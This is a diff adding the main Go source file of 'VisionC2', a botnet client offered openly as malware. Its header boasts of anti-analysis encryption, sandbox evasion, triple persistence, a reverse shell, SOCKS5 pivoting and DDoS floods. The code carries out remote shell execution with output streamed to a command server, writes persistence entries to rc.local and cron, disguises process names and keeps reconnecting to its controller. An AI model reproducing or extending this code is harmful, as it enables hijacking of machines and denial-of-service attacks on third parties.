@@ -1,0 +1,352 @@
+// ============================================================================
+// 	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⢀⢀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+// ⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⡴⠰⠞⠿⠛⠁⠓⠖⠲⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+// ⠀⠀⠀⠀⠀⠀⠀⢸⠆⢁⠶⠿⠇⠹⠁⠸⠷⠏⣈⡀⢰⠀⠈⠀⠀⠀⠀⠀⠀⠀
+// ⠀⠀⠀⠀⠀⠀⡁⠴⠛⢀⡀⠀⠀⢀⠀⠀⠀⠀⡀⠀⠀⠂⠄⠀⠀⠀⠀⠀⠀⠀
+// ⠀⠀⠀⠀⠀⠠⠀⢠⣴⣿⠀⠄⠈⠉⠀⠀⢀⠀⢻⡗⠀⠀⠐⠡⣄⡀⠀⠀⠀⠀				VisionC2
+// ⠀⠀⠀⠀⠀⣤⠒⢺⣿⣿⣆⠙⠄⢤⠠⠔⠘⢢⣞⠋⠀⢀⣰⣧⣬⡇⠀⠀⠀⠀					@Syn2Much
+// ⠀⠀⠀⠀⠈⠪⡅⠲⢿⢽⣿⣿⣶⣶⣦⣶⣿⠇⠴⠋⠍⢉⣹⣿⠿⠀⠀⠀⠀⠀
+// ⠀⠀⠀⠀⠀⠀⠰⠆⠁⠀⢈⠉⠹⣹⠈⠁⠀⠆⢰⢆⢀⣾⣾⠉⠀⠀⠀⠀⠀⠀
+// ⠀⠀⠀⠀⠀⠀⠀⠀⠃⠷⠀⠄⣤⡀⠀⣠⠠⣤⠄⠼⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀
+// ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+//   
+// ============================================================================
+//
+//  For months I pulled apart dozens of Mirai variants line by line. I read every Xlabs
+//  and Krebs post about Unix Backdoors that existed. I watched script kiddies get their C2
+//  address decrypted in a hour by some random blog writer claiming to be a "researcer".
+//  We can do so much better. That's why I built Vision to survive anaylsis. 
+//
+//  Every string in this binary is encrypted. Unique Per-Build AES-128-CTR Keys. Zero plaintext.
+//  You throw it in strings? You get nothing. The address resolution alone is five layers deep — Base64 into XOR
+//  into RC4 into substitution into MD5 verification back through AES. 
+//
+//  It daemonizes like a proper Unix citizen. Fork. Setsid. Redirect every
+//  file descriptor to /dev/null. Mask the signals. Disappear into the
+//  process table like it was never there. And if you're running it in a VM?
+//  In a sandbox? With a debugger attached? It knows. It sleeps for 24-27 hours
+//  and lets you waste your time staring at nothing.
+//
+//  The payload suite is disgusting. Full reverse shell with output capture.
+//  SOCKS5 proxy with auth. Pivot through the infected host like it's your
+//  personal VPS. L4 and L7 flood engine with session-aware HTTP/2, Proxy Support, Rapid Reset, CF Bypass, ETC. 
+//
+//  Comms are TLS-pinned server cert fingerprint baked into the binary. Run wireshark and
+//  you'll get a bunch of encrypted garbage back over port 443. 
+//  HMAC challenge-response. Server sends a nonce, bot proves it knows the key without ever sending it. Wrong response, no joining the c2.
+//  Replay old auth? Nonce is fresh every session.
+//
+//  It locks to a single instance. It reaps old PIDs so
+//  there's never two of it running. And persistence? Triple redundant —
+//  cron, systemd, rc.local. You clean one, two more bring it back. You
+//  clean two, the third is already running.
+//
+//  
+//  Every layer of obfuscation is a middle finger to every analyst 
+//  who thought they'd have an easy day. That's what this is.
+//
+//										
+//                                                        ~ Sin Too Much
+//	PS just run Setup.py 
+// ============================================================================
+
+package main
+
+import (
+	"bufio"
+	"bytes"
+	"fmt"
+	"math/rand"
+	"net"
+	"os"
+	"os/exec"
+	"strings"
+	"sync"
+	"syscall"
+	"time"
+)
+
+// ============================================================================
+// LOGGING & DEBUG FUNCTIONS
+// ============================================================================
+
+// deoxys prints debug messages when verboseLog is enabled.
+// Useful for troubleshooting C2 connection issues during development.
+// Parameters:
+//   - format: Printf-style format string
+//   - args: Format arguments
+func deoxys(format string, args ...interface{}) {
+	if verboseLog {
+		fmt.Printf("[DEBUG] "+format+"\n", args...)
+	}
+}
+
+var (
+	gDnVkWb  bool
+	yHcRqTp   sync.Mutex
+	nBxFmZj   int32
+	kQvSdNw  chan struct{}
+	xKvNhBm      = make(chan struct{})
+	wQtJdRc     sync.Mutex
+	mPzLsXf bool
+
+
+	// Proxy support for L7 attacks (pre-validated by CNC)
+	proxyList      []string
+	proxyListMutex sync.RWMutex
+
+	// SOCKS5 credentials mutex
+	socksCredsMutex sync.RWMutex
+
+	// Pre-cached bot metadata (computed once in main before connecting)
+	cachedBotID  string
+	cachedArch   string
+	cachedRAM    int64
+	cachedCPU    int
+	cachedProc   string
+	cachedUplink float64
+)
+
+// guardedGo runs fn in a goroutine with panic recovery logged via deoxys.
+// Use for any worker whose failure must not crash the bot.
+func guardedGo(name string, fn func()) {
+	go func() {
+		defer func() {
+			if r := recover(); r != nil {
+				deoxys("panic in %s: %v", name, r)
+			}
+		}()
+		fn()
+	}()
+}
+
+// ============================================================================
+// UTILITY FUNCTIONS
+// ============================================================================
+
+// sandworm appends a line to a file, creating it if it doesn't exist.
+// Used for adding persistence entries to system files like /etc/rc.local.
+// Parameters:
+//   - path: File path to append to
+//   - line: Content to append
+//   - perm: File permissions if creating new file
+//
+// Returns: error if file operation fails
+func sandworm(path, line string, perm os.FileMode) error {
+	if verboseLog {
+		deoxys("sandworm: [DEBUG] Would open file %s for append", path)
+		deoxys("sandworm: [DEBUG] Would write: %s", strings.TrimSpace(line))
+		deoxys("sandworm: [DEBUG] Skipping actual write (debug mode)")
+		return nil
+	}
+
+	// Production mode - execute silently
+	f, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY|os.O_CREATE, perm)
+	if err != nil {
+		return err
+	}
+	defer f.Close()
+	_, err = f.WriteString(line)
+	return err
+}
+
+// turla generates a random alphanumeric string of specified length.
+// Used for generating random filenames, process names, and request data.
+// Parameters:
+//   - n: Length of random string to generate
+//
+// Returns: Random string containing a-z and 0-9 characters
+func turla(n int) string {
+	const letters = "abcdefghijklmnopqrstuvwxyz0123456789"
+	b := make([]byte, n)
+	for i := range b {
+		b[i] = letters[rand.Intn(len(letters))]
+	}
+	return string(b)
+}
+
+// kimsuky generates a random process name that looks like a legitimate system process.
+// Combines common daemon names with random suffix to avoid detection.
+// Returns: String like "syncd-a7x2" or "crond-9k1m"
+func kimsuky() string {
+	dict := camoNames
+	return dict[rand.Intn(len(dict))] + "-" + turla(4)
+}
+
+// ============================================================================
+// SHELL EXECUTION FUNCTIONS
+// ============================================================================
+
+// sidewinder executes a shell command and captures output synchronously.
+// Runs command via "sh -c" and captures both stdout and stderr.
+// Parameters:
+//   - cmd: Shell command string to execute
+//
+// Returns: Combined stdout/stderr output, and error if command failed
+func sidewinder(cmd string) (string, error) {
+	args := []string{shellBin, shellFlag, cmd}
+	command := exec.Command(args[0], args[1:]...)
+	var stdout, stderr bytes.Buffer
+	command.Stdout = &stdout
+	command.Stderr = &stderr
+	err := command.Run()
+	if err != nil {
+		return fmt.Sprintf("Error: %v\nStderr: %s", err, stderr.String()), err
+	}
+	output := stdout.String()
+	if stderr.Len() > 0 {
+		output += "\nStderr: " + stderr.String()
+	}
+	return output, nil
+}
+
+// oceanLotus executes a shell command in detached/background mode.
+// Uses Setsid to create new session, disconnecting from parent.
+// Useful for long-running commands that shouldn't block C2 communication.
+// Parameters:
+//   - cmd: Shell command string to execute in background
+func oceanLotus(cmd string) {
+	go func() {
+		args := []string{shellBin, shellFlag, cmd}
+		command := exec.Command(args[0], args[1:]...)
+		command.SysProcAttr = &syscall.SysProcAttr{Setsid: true}
+		command.Stdout = nil
+		command.Stderr = nil
+		command.Stdin = nil
+		if err := command.Start(); err == nil {
+			go command.Wait()
+		}
+	}()
+}
+
+// machete executes a shell command with real-time output streaming to C2.
+// Output is sent line-by-line as it becomes available, prefixed with STDOUT/STDERR.
+// Useful for long-running commands where immediate feedback is needed.
+// Parameters:
+//   - cmd: Shell command string to execute
+//   - conn: C2 connection to stream output to
+//
+// Returns: error if command setup fails
+func machete(cmd string, conn net.Conn) error {
+	args := []string{shellBin, shellFlag, cmd}
+	command := exec.Command(args[0], args[1:]...)
+	stdout, err := command.StdoutPipe()
+	if err != nil {
+		return err
+	}
+	stderr, err := command.StderrPipe()
+	if err != nil {
+		return err
+	}
+	if err := command.Start(); err != nil {
+		return err
+	}
+	go func() {
+		scanner := bufio.NewScanner(stdout)
+		for scanner.Scan() {
+			conn.Write([]byte(fmt.Sprintf(protoStdoutFmt, scanner.Text())))
+		}
+	}()
+	go func() {
+		scanner := bufio.NewScanner(stderr)
+		for scanner.Scan() {
+			conn.Write([]byte(fmt.Sprintf(protoStderrFmt, scanner.Text())))
+		}
+	}()
+	err = command.Wait()
+	if err != nil {
+		conn.Write([]byte(fmt.Sprintf(protoExitErrFmt, err)))
+	} else {
+		conn.Write([]byte(protoExitOk))
+	}
+	return nil
+}
+
+// ============================================================================
+// MAIN ENTRY POINT
+// ============================================================================
+
+// main is the bot's entry point that orchestrates startup and C2 connection.
+// Startup sequence:
+//  1. Check for sandbox/analysis environment (winnti)
+//  2. Setup basic persistence
+//  3. Resolve C2 address via multi-method DNS (dialga)
+//  4. Enter reconnection loop with TLS connections
+//
+// The bot will continuously attempt to reconnect on disconnection.
+func main() {
+	// Decrypt all sensitive strings before anything else touches them.
+	initRuntimeConfig()
+
+	// Daemonize first — forks, detaches, redirects fds, ignores signals.
+	// Parent exits here; only the daemon child continues past this point.
+	stuxnet()
+
+	deoxys("main: Bot starting up...")
+	deoxys("main: Protocol version: %s", buildTag)
+	if winnti() {
+		// Sleep 24-27h — outlasts sandbox analysis windows without
+		// producing a suspicious immediate exit.
+		jitter := time.Duration(24*3600+rand.Intn(3*3600)) * time.Second
+		deoxys("main: Sandbox/analysis environment confirmed (see winnti logs above), sleeping %v before exit", jitter)
+		time.Sleep(jitter)
+		os.Exit(0)
+	}
+	deoxys("main: No sandbox detected, continuing")
+	revilSingleInstance()
+	deoxys("main: Running persistence check (rc.local)...")
+	hRpCwZt()
+	deoxys("main: rc.local persistence check complete")
+	deoxys("main: Running persistence check (cron)...")
+	bNkXqVm()
+	deoxys("main: cron persistence check complete")
+	// Pre-compute bot metadata BEFORE connecting so REGISTER is instant.
+	cachedBotID = mustangPanda()
+	cachedArch = charmingKitten()
+	cachedRAM = revilMem()
+	cachedCPU = revilCPU()
+	cachedProc = revilProc()
+	cachedUplink = revilUplinkCached()
+	deoxys("main: Pre-cached metadata — ID:%s Arch:%s RAM:%dMB CPU:%d Proc:%s Uplink:%.2fMbps",
+		cachedBotID, cachedArch, cachedRAM, cachedCPU, cachedProc, cachedUplink)
+
+	deoxys("main: Resolving C2 address...")
+	c2Address := dialga()
+	if c2Address == "" {
+		deoxys("main: Failed to resolve C2, exiting")
+		return
+	}
+	deoxys("main: C2 resolved to: %s", c2Address)
+	host, port, err := scarcruft(c2Address)
+	if err != nil {
+		deoxys("main: Failed to parse C2 address: %v", err)
+		return
+	}
+	deoxys("main: C2 Host: %s, Port: %s", host, port)
+	deoxys("main: Entering main connection loop...")
+	backoff := retryFloor
+	maxBackoff := 30 * time.Second
+	for {
+		deoxys("main: Attempting connection to C2...")
+		conn, err := gamaredon(host, port)
+		if err != nil {
+			jitter := time.Duration(rand.Int63n(int64(2*time.Second)) + int64(100*time.Millisecond))
+			delay := backoff + jitter
+			deoxys("main: Connection failed: %v, retrying in %v", err, delay)
+			time.Sleep(delay)
+			if backoff < maxBackoff {
+				backoff += 3 * time.Second
+				if backoff > maxBackoff {
+					backoff = maxBackoff
+				}
+			}
+			continue
+		}
+		backoff = retryFloor // reset on successful connect
+		deoxys("main: Connected to C2, starting handler")
+		anonymousSudan(conn)
+		delay := retryFloor + time.Duration(rand.Int63n(int64(retryCeil-retryFloor)))
+		deoxys("main: Handler returned, reconnecting in %v", delay)
+		time.Sleep(delay)
+	}
+}
